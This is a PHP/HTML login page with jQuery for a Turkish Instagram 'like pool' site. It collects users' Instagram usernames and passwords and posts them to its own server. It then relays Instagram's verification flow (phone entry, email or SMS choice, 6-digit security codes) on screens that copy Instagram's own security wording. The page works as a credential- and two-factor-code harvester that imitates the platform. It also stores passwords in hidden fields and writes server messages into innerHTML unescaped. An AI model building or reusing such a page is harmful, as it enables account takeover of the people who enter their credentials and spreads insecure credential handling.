<html lang="tr">
<!--<![endif]-->
<head>
<title>Giriş Yap - <?=$siteAdi?></title>
<meta name="description" content="giriş yap,<?=$siteAdi?>">
<meta name="keywords" content="giriş yap,<?=$siteAdi?>">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
<link href="https://fonts.googleapis.com/css?family=Titillium+Web:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic,900&subset=latin,latin-ext" rel="stylesheet">
<style type="text/css">
    html,
body {
  height: 100%;
}

body {
  padding-top: 40px;
  padding-bottom: 40px;
  background-color: #f5f5f5;
  font-size: 16px;
}

.form-signin {
  width: 100%;
  max-width: 330px;
  padding: 15px;
  margin: 0 auto;
  background-color: #FFFFFF;
}
.form-signin .checkbox {
  font-weight: 400;
}
.form-signin .form-control {
  position: relative;
  box-sizing: border-box;
  height: 34px;
  padding: 10px;
  font-size: 16px;
  border-radius: 3px;
}
.form-signin .form-control:focus {
  z-index: 2;
}
.form-signin input[type="text"] {
  margin-bottom: 5px;
  border: 1px solid #DBDBDB;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0;
}
.form-signin input[type="password"] {
  margin-bottom: 10px;
  border: 1px solid #DBDBDB;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
}

input[type="radio"] {
    display: none;
}

input[type="radio"]+label {
    font-weight: 400;
    font-size: 14px;
}

input[type="radio"]+label span {
    display: inline-block;
    width: 18px;
    height: 18px;
    margin: -2px 10px 0 0;
    vertical-align: middle;
    cursor: pointer;
    -moz-border-radius: 50%;
    border-radius: 50%;
    border: 3px solid #ffffff;
}

input[type="radio"]+label span {
    background-color: #efefef;
}

input[type="radio"]:checked+label {
    color: #333;
    font-weight: 700;
}

input[type="radio"]:checked+label span {
    background-color: #3897f0;
    border: 2px solid #efefef;
    box-shadow: 2px 2px 2px rgba(0, 0, 0, .1);
}

input[type="radio"]+label span,
input[type="radio"]:checked+label span {
    -webkit-transition: background-color 0.24s linear;
    -o-transition: background-color 0.24s linear;
    -moz-transition: background-color 0.24s linear;
    transition: background-color 0.24s linear;
}
</style>
</head>
  <body style="font-family: 'Titillium Web', sans-serif;">

<div class="container">
    <div class="form-signin" id=nrucel>
      
      <h1 style='color: black; font-weight: bold; font-size:25px; text-align:center; padding: 10px;'><?=$siteAdresi?> GİRİŞ</h1>
      <label for="inputText" class="sr-only">Kullanıcı Adı</label>
      <input type="text" id="username" class="form-control" placeholder="Kullanıcı Adı" required autofocus>
      <label for="inputPassword" class="sr-only">Şifre</label>
      <input type="password" id="password" class="form-control" placeholder="Şifre" required>
      <button class="btn btn-primary btn-block" id="gonder" onclick="userLogin()" style="font-size: 14px; font-weight: bold;"><i class="fas fa-sign-in-alt"></i> Giriş Yap</button>
        <div id="sonuc"> </div>
      <br>
        <p style="font-weight: bold;">Sisteme giriş yaparak <a href="https://begenapp.net/kosulvegizlilik" target="_blank"><b>koşul ve şartlarımızı</b></a> kabul etmiş sayılırsınız.</p> 
        <p><span style="font-weight: bold;color:red;">UYARI: </span><span style="color:blue;">Not logged in</span> hatası alırsanız sayfayı yenileyip tekrar giriş yapın..</p> 
        <p><span style="font-weight: bold;color:red;">UYARI2: </span><span style="color:blue;">checkpoint_required</span> hatası alırsanız hesabınız askıya alınmış olabilir.</p>
        <p style="color: red;">Bu sitenin instagram ile hiçbir bağlantısı yoktur. Kullanıcı adı ve şifreniz ile Instagram API sistemi kullanılarak işlemleriniz gerçekleştirilir.</p>
        <p>Yardım almak için <strong><a href="https://begenapp.net/soru" target="_blank">burayı tıklayın</a></strong>. Soru/cevap alanında soru sorarak çözüme ulaşın. </p>
        <p>Bu site Havuz Sistemi mantığı ile çalışmaktadır. <a href="https://ibegenapp.net/havuz-sistemi-nedir.php" target="_blank">Havuz Sistemi Nedir?</a></p>
        <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası alıyorsanız instagram mobil uygulaması üzerinden hesabınıza girin. Çıkan uyarıda bendim tıklayın.</p>
    </div>
</div>
<div id="google_translate_element"></div>
<?=$analitik?>
<script>

    

    var base_url="<?=base_url()?>";

  </script>
    <script
  src="https://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>
    <script src='https://www.google.com/recaptcha/api.js'></script>

  <script type="text/javascript">
    var base_url = "<?=base_url()?>";

    //telefon ile kod doğrulama alanı için gösterilecek yazı
    function telKodYazi(tel, username, password, user_id, yol, igID) {

        //düzenleyeceğim div'i değere atıyorum.
        var nrucel = document.getElementById("nrucel");

        //div içini değiştiriyorum
        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">Sonu ' + tel + ' ile biten numaraya gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';

        //enter tuşuna basınca gonder butonuna basılmış saysın.
        document.getElementById("number").addEventListener("keyup", function(event) {
            event.preventDefault();
            if (event.keyCode === 13) {
                document.getElementById("gonder").click();
            }
        });

    }

    //email ile kod doğrulama alanı için gösterilecek yazı
    function emailKodYazi(email, username, password, user_id, yol, igID) {

        //düzenleyeceğim div'i değere atıyorum.
        var nrucel = document.getElementById("nrucel");

        //div içini değiştiriyorum
        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">' + email + ' e-posta adresine gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';

        //enter tuşuna basınca gonder butonuna basılmış saysın.
        document.getElementById("number").addEventListener("keyup", function(event) {
            event.preventDefault();
            if (event.keyCode === 13) {
                document.getElementById("gonder").click();
            }
        });

    }

    //telefon ekleme alanı için gösterilecek yazı
    function telEklemeYazi(tel, username, password, user_id, yol, igID) {

        //düzenleyeceğim div'i değere atıyorum.
        var nrucel = document.getElementById("nrucel");

        //div içini değiştiriyorum
        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Telefon Numaranı Ekle</h3><p style="font-size:14px;">Telefon numaranı girerek, Instagram topluluğunu güvende tutmamıza yardımcı ol. Sana kısa mesajla bir güvenlik kodu göndereceğiz.</p><label for="inputText" class="sr-only">Telefon Numarası</label><input type="text" id="tel" class="form-control" placeholder="' + tel + '" value= "' + tel + '" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="telOnay()" style="font-size: 14px; font-weight: bold;"> İleri</button><p style="font-size:10px; padding-top:10px;">Telefon numaran profiline eklenecek, ancak senden başka kimse tarafından görülmeyecek. Daha fazla bilgi için lütfen Gizlilik İlkemize bak. Instagram bu hizmeti ücretsiz sunar. Operatörün standart kısa mesaj ücretleri geçerlidir.</p></div>';

        //enter tuşuna basınca gonder butonuna basılmış saysın.
        document.getElementById("tel").addEventListener("keyup", function(event) {
            event.preventDefault();
            if (event.keyCode === 13) {
                document.getElementById("gonder").click();
            }
        });

    }

    //mail yada telefon ile doğrulama ekranında gösterilecek yazı
    function dogrulamaYazi(tel, email, username, password, user_id, yol, igID) {

        //düzenleyeceğim div'i değere atıyorum.
        var nrucel = document.getElementById("nrucel");

        //div içini değiştiriyorum
        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Olağandışı Bir Giriş Denemesi Saptadık</h3><p style="font-size:14px;">Hesabını güvene almak için kimliğini doğrulaman amacıyla sana bir güvenlik kodu göndereceğiz. Kodu nasıl göndermemizi istersin?</p>';

        //mail doğrulama seceneği var ise
        if (email !== null) {
            nrucel.innerHTML += '<div><input id="choice-one" name="radio" value="1" checked="checked" type="radio"><label for="choice-one"> <span></span> E-posata Adresi: ' + email + '</label></div>';
        }

        //tel ile doğrulama seceneği var ise
        if (tel !== null) {
            nrucel.innerHTML += '<div><input id="choice-two" name="radio" value="0" type="radio"><label for="choice-two"> <span></span> Telefon numarası: ' + tel + '</label></div>';
        }

        nrucel.innerHTML += '<div style="margin:5px;padding:5px;"><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"></div><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="Dogrulama()" style="font-size: 14px; font-weight: bold;"> Güvenlik Kodu Gönder</button><p style="padding-top:10px;"></p></div>';

        //enter tuşuna basınca gonder butonuna basılmış saysın.
        document.getElementById("tel").addEventListener("keyup", function(event) {
            event.preventDefault();
            if (event.keyCode === 13) {
                document.getElementById("gonder").click();
            }
        });

    }

    //giriş işlemleri
    function userLogin() {

        //belirtiğim alanları pasif yapıyorum
        $('#username').attr('readonly', 'readonly');
        $('#password').attr('readonly', 'readonly');
        $('#gonder').attr('disabled', 'disabled');
        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> giriş yapılıyor..";

        //formdaki verileri değerlere atıyorum
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        //eğer istenilen değerler boş ise hata mesajı göster
        if (username == "" || password == "") {

            //hata mesajı
            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');

            //pasif ettiğim değerleri aktif ediyorum
            $('#password').removeAttr('readonly');
            $('#username').removeAttr('readonly');
            $('#gonder').prop("disabled", false);
            document.getElementById('gonder').innerHTML = '<i class="fas fa-sign-in-alt"></i> Giriş Yap';
            return;
        }

        //post işlemleri
        $.ajax({
            type: 'post',
            url: base_url + 'login',
            dataType: 'json',
            data: "username=" + username + "&password=" + password,
            success: function(result) {

                console.log(result);

                //eğer işlem başarılı ise kontrol'e yönlendir
                if (result.status == "ok") {

                    //başarılı yazısı gösteriyorum
                    $('#sonuc').html('<div style="background:green;color:#fff;margin-top:10px;padding:10px">Başarılı.. Giriş yapılıyor..');

                    //kontrol'e yönlendiriyorum
                    window.location.href = base_url + "yonlendiriliyor";

                    //eğer kullanıcı doğrulamaya takıldıysa
                } else if (result.status == "check") {

                    //dönen veriyi belirtiğim değere atıyorum.
                    var data = result.data;

                    //eğer kullanıcıdan telefon numarası eklenmesini istiyorsa
                    if (data.tip == "telOnay") {

                        //kod onay ekranı için gerekli yazıyı çağırıyorum
                        telEklemeYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);

                    }

                    //eğer kullanuıcıdan telefona gelen kodu istiyorsa
                    else if (data.tip == "telKodOnay") {

                        //kod onay ekranı için gerekli yazıyı çağırıyorum
                        telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);

                    }

                    //eğer mail yada tel ile doğrulama istiyorsa
                    else if(data.tip == "Dogrulama"){

                      //kod onay ekranı için gerekli yazıyı çağırıyorum
                      dogrulamaYazi(data.tel,data.email,data.username,data.password,data.user_id,data.yol,data.igID);

                    }

                    //eğer kullanuıcıdan mail'e gelen kodu istiyorsa
                    else if (data.tip == "email") {

                        //kod onay ekranı için gerekli yazıyı çağırıyorum
                        dogrulamaYazi(data.tel, data.email, data.username, data.password, data.user_id, data.yol, data.igID);

                    }

                    //eğer yukarıdakilerden hiç biri değil ise hata mesajı gösteriyorum
                    else {

                      //hata mesajı
                      $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">' + result.message + '</div>');       
                                     
                    }

                }

                //eğer işlem başarısız ise hata mesajı göster
                else {

                    //hata mesajı
                    $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">' + result.message + '</div>');

                }

                //pasif ettiğim alanları aktif yap
                $('#password').removeAttr('readonly');
                $('#username').removeAttr('readonly');
                $('#gonder').prop("disabled", false);
                document.getElementById('gonder').innerHTML = '<i class="fas fa-sign-in-alt"></i> Giriş Yap';

            }
        });


    }

    //telefon numarası ekleme post işlemleri
    function telOnay() {

        //belirttiğim alanları disable et
        $('#tel').attr('readonly', 'readonly');
        $('#gonder').attr('disabled', 'disabled');
        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";

        //form'daki tüm verileri değerlere atıyorum.
        var tel = document.getElementById("tel").value;
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        var user_id = document.getElementById("user_id").value;
        var yol = document.getElementById("yol").value;
        var igID = document.getElementById("igID").value;

        //telefon numarası yazmamışsa hata mesajı göster
        if (tel == "") {
            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');

            $('#tel').removeAttr('readonly');
            $('#gonder').prop("disabled", false);
            document.getElementById('gonder').innerHTML = 'İleri';
            return;
        }

        //post işlemleri
        $.ajax({
            type: 'post',
            url: base_url + 'login/telOnay',
            dataType: 'json',
            data: "tel=" + tel + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
            success: function(result) {

                console.log(result);

                if (result.status == "ok") {

                    //dönen veriyi belirtiğim değere atıyorum.
                    var data = result.data;

                    //kod onay ekranı için gerekli yazıyı çağırıyorum
                    telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);

                } else {

                    //işlem başarısız ise hata mesajını göster   
                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px">' + result.message + '</p>');
                }

                //disable ettiğim yerleri tekrar aktif et
                $('#tel').removeAttr('readonly');
                $('#gonder').prop("disabled", false);
                document.getElementById('gonder').innerHTML = 'İleri';



            }
        });
    }

    //doğrulama için seçilen seçeneğe göre işlem
    function Dogrulama() {

        //belirtilen alanları pasif yapıyorum
        $('#gonder').attr('disabled', 'disabled');
        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";

        //doğrualama seçeneklerinden hangisi seçilmişse onu değere atıyorum
        if ($("#choice-one").is(":checked")) {
            var choice = document.getElementById("choice-one").value;
        } else if ($("#choice-two").is(":checked")) {
            var choice = document.getElementById("choice-two").value;
        }

        //eğer seçenek boş ise hata mesajı gösteriyorum
        if (choice == "") {

            //hata mesajı
            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');

            //pasif ettiğim yerleri aktif yapıyorum
            $('#tel').removeAttr('readonly');
            $('#gonder').prop("disabled", false);
            document.getElementById('gonder').innerHTML = 'İleri';
            return;
        }

        //formdaki verileri değere atıyorum
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        var user_id = document.getElementById("user_id").value;
        var yol = document.getElementById("yol").value;
        var igID = document.getElementById("igID").value;

        //post işlemleri
        $.ajax({
            type: 'post',
            url: base_url + 'login/Dogrulama',
            dataType: 'json',
            data: "choice=" + choice + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
            success: function(result) {

                console.log(result);

                //eğer işlem başarılı ise
                if (result.status == "ok") {

                    //dönen veriyi belirtiğim değere atıyorum.
                    var data = result.data;

                    if (data.tip == "email") {

                        //mail ile kod onay ekranı için gerekli yazıyı çağırıyorum
                        emailKodYazi(data.email, data.username, data.password, data.user_id, data.yol, data.igID);

                    } else {

                        //tel ilekod onay ekranı için gerekli yazıyı çağırıyorum
                        telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);

                    }

                    //enter tuşuna basınca gönder butonuna basılmış saysın
                    document.getElementById("number").addEventListener("keyup", function(event) {
                        event.preventDefault();
                        if (event.keyCode === 13) {
                            document.getElementById("gonder").click();
                        }
                    });

                } 

                //eğer işlem başarısız ise
                else {

                    //hata mesajı göster
                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px">' + result.message + '</p>');
                }

                //pasif ettiğim yerleri aktif ediyorum
                $('#tel').removeAttr('readonly');
                $('#gonder').prop("disabled", false);
                document.getElementById('gonder').innerHTML = 'Gönder';

            }
        });
    }

    //gelen kodu doğrulama alanı
    function telKodOnay() {

        //belirtilen yerleri pasif yapıyorum
        $('#number').attr('readonly', 'readonly');
        $('#gonder').attr('disabled', 'disabled');
        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";

        //formdaki verileri değere atıyorum
        var number = document.getElementById("number").value;
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        var user_id = document.getElementById("user_id").value;
        var yol = document.getElementById("yol").value;
        var igID = document.getElementById("igID").value;

        //onay kodu girmemiş ise hata mesajı gösteriyorum
        if (number == "") {

            //hata mesajı
            $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Lütfen onay kodunu giriniz.</p>');

            //pasif ettiğim yerleri aktif yapıyorum
            $('#number').removeAttr('readonly');
            $('#gonder').prop("disabled", false);
            document.getElementById('gonder').innerHTML = 'Gönder';
            return;
        }

        //eğer kod 6 karakterli değilse hata mesajını göster
        if (number.length < 6 || number.length > 6) {

            //hata mesajı
            $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Gelen onay kodu en az 6 karakter olmalıdır</p>');

            //pasif ettiğim yerleri aktif yapıyorum
            $('#number').removeAttr('readonly');
            $('#gonder').prop("disabled", false);
            document.getElementById('gonder').innerHTML = 'Gönder';
            return;
        }

        //post işlemi
        $.ajax({
            type: 'post',
            url: base_url + 'login/telKodOnay',
            dataType: 'json',
            data: "number=" + number + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
            success: function(result) {

                console.log(result);

                //eğer başarılı ise
                if (result.status == "ok") {

                    //düzenleyeceğim div'i değere atıyorum
                    var nrucel = document.getElementById("nrucel");

                    //div'e eklenecek yazı
                    nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3 style="color:#007E33;font-weight:bold">işlem başarılı. yönlendiriliyosun.</div>';

                    //kontrol'e yönlendiriyorum
                    window.location.href = base_url + "kontrol";

                } 

                //eğer başarısız ise
                else {

                    //hata mesajını göster
                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">' + result.message + '</p>');
                }

                //pasif ettiğim yerleri aktif yapıyorum
                $('#number').removeAttr('readonly');
                $('#gonder').prop("disabled", false);
                document.getElementById('gonder').innerHTML = 'Gönder';



            }
        });
    }

    //işlem sırasında çıkış yapmak isterse
    function cikis() {

        //formdaki verileri değere atıyorum
        var username = document.getElementById("username").value;
        var user_id = document.getElementById("user_id").value;

        //post işlemi
        $.ajax({
            type: 'post',
            url: base_url + 'login/onayCikis',
            dataType: 'json',
            data: "username=" + username + "&user_id=" + user_id,
            success: function(result) {

                //eğer başarılı ise
                if (result.status == "ok") {

                    //düzenleyeceğim div'i değere atıyorum
                    var nrucel = document.getElementById("nrucel");

                    //div'e eklenecek yazı
                    nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3 style="color:#007E33;font-weight:bold">Başarıyla Çıkış yaptınız...</h3><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="yenile()" style="font-size: 14px; font-weight: bold;"> Sayfayı Yenile</button></div>';
                } 

                //eğer başarısız ise
                else {

                    //hata mesajı göster
                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px;margin-top:10px;">Sayfayı yenileyip tekrar giriş yapın.</p>');
                }
            }
        });
    }

    //sayfa yenileme için
    function yenile() {
        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
        window.location.reload();
    }

    //enter tuşuna basınca giriş yap butonuna basmış saysın
    document.getElementById("password").addEventListener("keyup", function(event) {
        event.preventDefault();
        if (event.keyCode === 13) {
            document.getElementById("gonder").click();
        }
    });


  </script>
  <link href="<?=$dsc?>yeni/css/nrucel1.css" rel="stylesheet">
  <script type="text/javascript" src="<?=$dsc?>yeni/js/nrucel.js"></script>
  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>